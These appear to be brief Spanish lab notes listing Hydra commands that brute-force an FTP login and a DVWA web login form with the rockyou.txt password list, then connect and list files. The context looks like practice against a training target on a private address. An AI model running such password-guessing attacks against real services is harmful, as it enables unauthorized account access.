$ hydra ip ftp -l si_tengo_el_usuario -P rockyou.txt -s puerto
$ ftp ip -> debería aparecer conectado
$ ftp > ls
$ ftp > 
$ hydra -l admin -P rockyou.txt 192.168.64.3 http-post-form ‘/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed’
